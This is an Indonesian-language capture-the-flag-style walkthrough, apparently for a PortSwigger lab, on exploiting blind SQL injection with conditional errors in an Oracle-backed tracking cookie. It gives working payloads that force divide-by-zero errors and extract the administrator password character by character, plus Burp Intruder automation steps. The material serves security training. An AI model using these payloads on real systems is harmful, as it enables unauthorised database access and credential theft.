# **Blind SQL Injection dengan Conditional Errors** (Bahasa Indonesia)

Lab ini memiliki kerentanan blind SQL injection pada cookie pelacakan. Aplikasi tidak mengembalikan hasil query, tetapi memberikan pesan kesalahan khusus jika query SQL menghasilkan error. Anda dapat mengeksploitasi celah ini untuk menemukan password pengguna administrator dan login sebagai admin.

---

### **Langkah-Langkah Eksploitasi**

#### **1. Uji Kerentanan**
Masukkan payload berikut ke header cookie:
```plaintext
Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
```
Jika query berhasil (tidak error), aplikasi akan tetap merespon seperti biasa.

#### **2. Trigger Error untuk Validasi**
Gunakan payload berikut untuk memaksa error:
```sql
Cookie: TrackingId=9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a
```
- **1=1** menghasilkan error **500**.
- **1=2** menghasilkan status normal **200**.

Payload Oracle menggunakan fungsi `TO_CHAR(1/0)` untuk memaksa pembagian dengan nol (error).

---

#### **3. Cari Password Admin dengan Brute Force**
Gunakan fungsi Oracle seperti `SUBSTR` untuk mengambil karakter password:
```sql
Cookie: TrackingId=9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
```

**Penjelasan Query:**
- `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)`:
  - Mengambil karakter pertama password admin.
- `CASE WHEN ... THEN TO_CHAR(1/0)`:
  - Jika karakter cocok (misalnya 'a'), query menghasilkan error.
  - Jika tidak cocok, query berjalan normal.

---

#### **4. Automasi dengan Intruder dan Cluster Bomb**
1. **Gunakan Burp Suite Intruder**:
   - Kirim permintaan ke Intruder.
   - Pilih lokasi karakter password dengan marker (`§`).
   - Contoh:
     ```
     Cookie: TrackingId=4if4HB4swUlejCm0'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),§1§,1))='§a§')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
     ```
2. **Konfigurasi Cluster Bomb**:
   - Parameter 1: Posisi karakter (1, 2, 3, ...).
   - Parameter 2: Kemungkinan nilai (a-z, 0-9).

3. **Analisis Respon**:
   - **500 Internal Server Error** menandakan karakter cocok.
   - Lanjutkan hingga seluruh password ditemukan.

---

### **Contoh Hasil**
1. **Karakter Pertama**: Respon menunjukkan karakter pertama adalah `0`.
2. **Lanjutkan** hingga menemukan seluruh password, misalnya: `01k6j5tbrjpd9lpdk4zs`.

---

### **Referensi**
- [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### **Ilustrasi**

#### **Langkah Uji Kerentanan**
- **1=1**: Menghasilkan error **500**.
- **1=2**: Respon normal **200**.

#### **Brute Force Password**
- Hasil:
  - Karakter pertama: `0`.
  - Password lengkap: `01k6j5tbrjpd9lpdk4zs`.
